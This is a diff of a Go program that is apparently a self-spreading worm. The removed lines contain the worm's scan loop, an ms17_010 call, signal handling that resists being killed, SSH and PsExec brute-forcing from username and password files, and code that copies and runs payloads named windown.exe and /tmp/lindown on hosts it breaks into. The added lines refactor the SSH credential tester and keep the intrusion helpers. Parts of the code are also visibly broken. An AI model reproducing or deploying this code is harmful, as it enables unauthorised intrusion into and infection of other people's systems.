@@ -1,22 +1,28 @@
 package main
 
 import (
-	"runtime"
 	"os"
 	"log"
-	"syscall"
 	"golang.org/x/crypto/ssh"
 	"fmt"
 	"time"
 	"strings"
 	"bufio"
-	"sync"
 	"github.com/tmc/scp"
-	"github.com/syossan27/tebata"
 	"os/exec"
 	"net"
 	"regexp"
+	"strconv"
+	"github.com/go-openapi/errors"
 )
+
+type infosession struct {
+	iswork bool
+	username string
+	password string
+	ssh	*ssh.Client
+
+}
 
 func handler1() {
 	cmd := exec.Command(os.Args[0])
@@ -24,119 +30,8 @@ func handler1() {
 	os.Exit(13)
 }
 
-func main() {
-	t := tebata.New(syscall.SIGINT, syscall.SIGTERM, syscall.SIGABRT, syscall.SIGKILL)
-	t.Reserve(handler1)
-	myos := runtime.GOOS
-	ms17_010()
-	startwormingboi(myos)
-	for len(os.Args) == 1 {
-		time.Sleep(5 * time.Minute)
-		ms17_010()
-		startwormingboi(myos)
-	}
-}
 
-func startwormingboi(myos string) {
-
-
-
-
-	var subnets = ""
-	if len(os.Args) == 1 {
-		subnets = GetOutboundIP()
-	} else {
-		subnets = os.Args[1]
-	}
-	//Create random ips
-	var step = [3]string{"10", "30", "40"}
-	var myip = ""
-	var wg sync.WaitGroup
-	for _, element := range step {
-		myip = subnets + element
-		fmt.Println(myip)
-		wg.Add(1)
-		// CHANGEME
-		targetos := "windows"
-		go gettingin(myip, &wg, myos, targetos)
-	}
-	wg.Wait()
-}
-
-func gettingin(myip string, wg *sync.WaitGroup, myos string, targetos string) {
-
-	try_creds(myip,targetos)
-	defer wg.Done()
-}
-
-func try_creds(myip string, targetos string){
-	var user = readinfile("user.txt")
-	var passwds = readinfile("passwds.txt")
-	iswork := false
-	username := "username"
-	password := "password"
-	switch targetos {
-	case "windows":
-		iswork, username, password = perform_psexec(myip,user,passwds)
-	case "linux":
-		iswork, username, password = perform_ssh(myip,user,passwds)
-	}
-	if iswork {
-		fmt.Println( "ip:",myip,"username:",username,"password:", password)
-	}
-}
-func perform_ssh(myip string,user []string, passwds []string)(iswork bool, username string, password string){
-	n := 0
-	for j := 0; j < len(user); j++ {
-		for k := 0; k < len(passwds); k++ {
-			n = len(getinssh(myip, user[j], passwds[k]))
-			if n {
-				return true, user[j], passwds[k]
-			}
-		}
-	}
-}
-
-func perform_psexec(myip string, user []string, passwds []string)(result bool, username string, password string) {
-	passbreak := true
-	myos := runtime.GOOS
-	for j := 0; j < len(user); j++ {
-		for k := 0; k < len(passwds); k++ {
-			switch myos {
-			case "windows":
-				wincon := getinwin(myip, user[j], passwds[k])
-				switch wincon {
-				case 1:
-					fmt.Println("Im in windows with", myip, user[j], passwds[k])
-					username = user[j]
-					password = passwds[k]
-					result = true
-					passbreak = true
-					break
-				case 2:
-					fmt.Printf("\n didnt work windows with %s %s %s", myip, user[j], passwds[k])
-					result=false
-				default:
-					fmt.Println("target machine does not have psexec enabled")
-					result = false
-					passbreak = true
-					break
-				}
-			default:
-				fmt.Println("cant get onto windows from nonwindows :(")
-				result=false
-				passbreak = true
-				break
-
-			}
-			if passbreak {
-				break
-			}
-		}
-	}
-}
-
-func getinssh(myip string, user string, passwd string) (myreturn string) {
+func getinssh(myip string, user string, passwd string, port int64) (myreturn infosession, reterr error) {
 	sshConfig := &ssh.ClientConfig{
 		User:            user,
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
@@ -144,49 +39,38 @@ func getinssh(myip string, user string, passwd string) (myreturn string) {
 		Auth: []ssh.AuthMethod{
 			ssh.Password(passwd)},
 	}
-	var dest = myip + ":22"
+	var dest= myip + ":" + strconv.FormatInt(port, 10)
 	fmt.Println(dest)
 	connection, err := ssh.Dial("tcp", dest, sshConfig)
 	if err != nil {
 		fmt.Println(err)
 		if strings.Contains(err.Error(), "unable to authenticate") {
-			return "no"
+			return infosession{false,"","",nil}, errors.New(1,"Unable to authenticate")
 		} else {
-			return "w"
+			return infosession{false,"","",nil}, errors.New(2,"Unknown error")
 		}
 	}
-
-	session := newsession(connection)
-	scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
-	execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
-	scpexec(session, "lindown", "/tmp/lindown")
-	execlinuxcmd(session, "chmod +x /tmp/lindown")
-	execlinuxcmd(session, "./tmp/lindown > /dev/null 2>&1 &")
-	session.Close()
-	return "yes"
+	return infosession{true,user,passwd,connection}, nil
 }
 
-func newsession(connection *ssh.Client) (session *ssh.Session) {
+func newsession(connection *ssh.Client) (session *ssh.Session, reterr error) {
 	session, err := connection.NewSession()
 	if err != nil {
-
+		return nil, errors.New(3,"Unable to create session")
 	}
 	return
 }
 
 func execlinuxcmd(session *ssh.Session, cmd string) (err error) {
 	_, err = session.CombinedOutput(cmd)
-	if err != nil {
-	}
 	return
 }
 
-func scpexec(session *ssh.Session, srcfile string, destfile string) () {
-	err := scp.CopyPath(srcfile, destfile, session)
-	if err != nil {
-	}
+func scpexec(session *ssh.Session, srcfile string, destfile string) (err error) {
+	err = scp.CopyPath(srcfile, destfile, session)
 	return
 }
+
 
 func getinwin(myip string, user string, passwd string) (wincon int) {
 	pscom := "PsExec.exe"
@@ -208,6 +92,7 @@ func getinwin(myip string, user string, passwd string) (wincon int) {
 	}
 	return
 }
+
 
 func readinfile(myfile string) (readinarr []string) {
 	file, err := os.Open(myfile)
